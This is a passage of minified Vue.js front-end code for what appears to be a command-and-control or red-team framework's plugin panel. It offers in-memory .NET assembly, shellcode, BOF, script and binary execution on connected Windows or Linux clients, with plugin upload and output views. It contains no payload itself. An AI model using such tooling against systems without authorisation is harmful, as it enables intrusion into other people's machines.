Mode")},{default:y(()=>[u("div",nl,[C(d,{type:m.value==="execute-assembly"?"primary":"default",onClick:e[4]||(e[4]=h=>K("execute-assembly")),disabled:!U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("Execute Assembly(.NET程序内存执行)","Execute Assembly (.NET in-memory)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="inline-bin"?"primary":"default",onClick:e[5]||(e[5]=h=>K("inline-bin")),disabled:!U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("Inline Bin(其他exe程序内存执行)","Inline Bin (other exe in-memory)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="shellcode-inject"?"primary":"default",onClick:e[6]||(e[6]=h=>K("shellcode-inject")),disabled:!U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("shellcode执行(执行shellcode,上线其他C2等)","Shellcode (run shellcode, stage other C2)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="script"?"primary":"default",onClick:e[7]||(e[7]=h=>K("script")),disabled:U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("Script(Linux脚本内存执行)","Script (Linux script in-memory)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="binary"?"primary":"default",onClick:e[8]||(e[8]=h=>K("binary")),disabled:U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("Binary(Linux二进制执行)","Binary (Linux binary exec)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="bof"?"primary":"default",onClick:e[9]||(e[9]=h=>K("bof")),disabled:!U.value,class:"mode-button"},{default:y(()=>[I(r(s(l).tl("BOF(COFF内存执行)","BOF (COFF in-memory)")),1)]),_:1},8,["type","disabled"]),C(d,{type:m.value==="exec-file"?"primary":"default",onClick:e[10]||(e[10]=h=>K("exec-file")),class:"mode-button"},{default:y(()=>[I(r(s(l).tl("Exec File(临时文件执行,支持Go/Rust PE)","Exec File (temp file exec, Go/Rust PE)")),1)]),_:1},8,["type"])]),!U.value&&o.value.clientUid?(S(),H(g,{key:0,type:"info",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:y(()=>[I(r(s(l).tl("Linux 客户端：使用 Script 或 Binary 模式执行插件","Linux client: use Script or Binary mode")),1)]),_:1})):Z("",!0),U.value&&o.value.clientUid?(S(),H(g,{key:1,type:"warning",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:y(()=>[I(r(s(l).tl("Windows 客户端：使用 Execute Assembly / Inline Bin / Shellcode / BOF 模式","Windows client: use Execute Assembly / Inline Bin / Shellcode / BOF")),1)]),_:1})):Z("",!0),o.value.clientUid?Z("",!0):(S(),H(g,{key:2,type:"info",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:y(()=>[I(r(s(l).tl("请先选择客户端","Select a client first")),1)]),_:1}))]),_:1},8,["label"]),C(_,{label:s(l).tl("选择插件","Select Plugin"),required:""},{default:y(()=>[u("div",al,[C(x,{modelValue:o.value.selectedPlugin,"onUpdate:modelValue":e[11]||(e[11]=h=>o.value.selectedPlugin=h),placeholder:s(l).tl("请选择插件","Select a plugin"),class:"full-width",onChange:Ae},{default:y(()=>[(S(!0),O(te,null,de(k.value,h=>(S(),H(p,{key:h.name||h.Name,label:h.name||h.Name,value:h.name||h.Name},null,8,["label","value"]))),128))]),_:1},8,["modelValue","placeholder"]),o.value.selectedPlugin?(S(),H(d,{key:0,type:"danger",icon:s(rt),onClick:Oe},{default:y(()=>[I(r(s(l).tl("删除插件","Delete Plugin")),1)]),_:1},8,["icon"])):Z("",!0)])]),_:1},8,["label"]),o.value.selectedPlugin?(S(),H(_,{key:0,label:s(l).tl("插件详情","Plugin Details")},{default:y(()=>[u("div",ol,[z.value?(S(),O("div",sl,r(s(l).tl("加载详情中...","Loading plugin details...")),1)):w.value?(S(),O(te,{key:1},[u("div",il,[u("span",ul,r(s(l).tl("名称","Name")),1),u("span",rl,r(w.value.name||o.value.selectedPlugin),1)]),u("div",cl,[u("span",dl,r(s(l).tl("类型","Type")),1),u("span",pl,r(w.value.type||w.value.Type||"-"),1)]),u("div",hl,[u("span",fl,r(s(l).tl("大小","Size")),1),u("span",ml,r(s(Te)(w.value.size??w.value.Size??0)),1)]),u("div",vl,[u("span",gl,r(s(l).tl("修改时间","Modified")),1),u("span",_l,r(w.value.last_modified||w.value.LastModified||"-"),1)]),u("div",yl,[u("span",bl,r(s(l).tl("描述","Description")),1),u("span",wl,r(w.value.description||w.value.Description||"-"),1)]),u("button",{class:"cs-btn cs-btn-xs",onClick:ze},r(s(l).tl("下载","Download")),1)],64)):(S(),O("div",xl,r(s(l).tl("未能获取插件详情","Plugin details unavailable")),1))])]),_:1},8,["label"])):Z("",!0),C(_,{label:s(l).tl("参数","Arguments")},{default:y(()=>[C(N,{modelValue:o.value.arguments,"onUpdate:modelValue":e[12]||(e[12]=h=>o.value.arguments=h),placeholder:s(l).tl("请输入参数，例如：-h 192.168.0.0","Enter arguments, e.g. -h 192.168.0.0"),class:"full-width"},null,8,["modelValue","placeholder"])]),_:1},8,["label"]),u("div",$l,[u("div",Cl,[u("h4",kl,"📜 "+r(s(l).tl("执行输出","Execution Output")),1),u("div",Pl,[C(M,null,{default:y(()=>[C(d,{onClick:Ne,icon:"Delete",title:s(l).tl("清空输出","Clear Output")},{default:y(()=>[I(r(s(l).tl("清空","Clear")),1)]),_:1},8,["title"]),C(d,{onClick:je,icon:"CopyDocument",title:s(l).tl("复制全部","Copy All")},{default:y(()=>[I(r(s(l).tl("复制","Copy")),1)]),_:1},8,["title"]),C(d,{onClick:We,icon:"Download",title:s(l).tl("导出日志","Export Log")},{default:y(()=>[I(r(s(l).tl("导出","Export")),1)]),_:1},8,["title"]),C(d,{onClick:Ve,icon:"Refresh",title:s(l).tl("手动刷新","Manual Refresh"),disabled:!o.value.clientUid},{default:y(()=>[I(r(s(l).tl("刷新","Refresh")),1)]),_:1},8,["title","disabled"])]),_:1}),u("button",{class:"cs-btn cs-btn-primary",onClick:He,disabled:!o.value.clientUid||!o.value.selectedPlugin||!m.value||s(A)!==null},[s(A)?(S(),O("span",El,r(s(l).tl("执行中...","Executing...")),1)):(S(),O("span",Sl,r(s(l).tl("执行","Execute"))+" ("+r(V())+")",1))],8,Ul),s(A)?(S(),O("button",{key:0,class:"cs-btn cs-btn-danger",onClick:Be},r(s(l).tl("停止轮询","Stop Polling")),1)):Z("",!0)])]),u("div",Ll,[Qe(u("textarea",{ref_key:"outputTextarea",ref:ee,"onUpdate:modelValue":e[13]||(e[13]=h=>f.value=h),placeholder:"output",class:"output-textarea",readonly:"",style:et(s(B)?{height:s(D)+"px",width:s(L)+"px"}:{})},null,4),[[tt,f.value]]),u("div",{class:"resize-handle-corner",onMousedown:Ie},null,32),u("div",{class:"resize-handle-right",onMousedown:De},null,32),u("div",{class:"resize-handle-bottom",onMousedown:Me},null,32)])])]),_:1},8,["model"])]),C(Vt,{visible:le.value,"onUpdate:visible":e[14]||(e[14]=h=>le.value=h),onUploaded:ae},null,8,["visible"])],64)):(S(),H(s(i),{key:1}))])}}}),jl=$e(Tl,[["__scopeId","data-v-cb6db264"]]);export{jl as default};
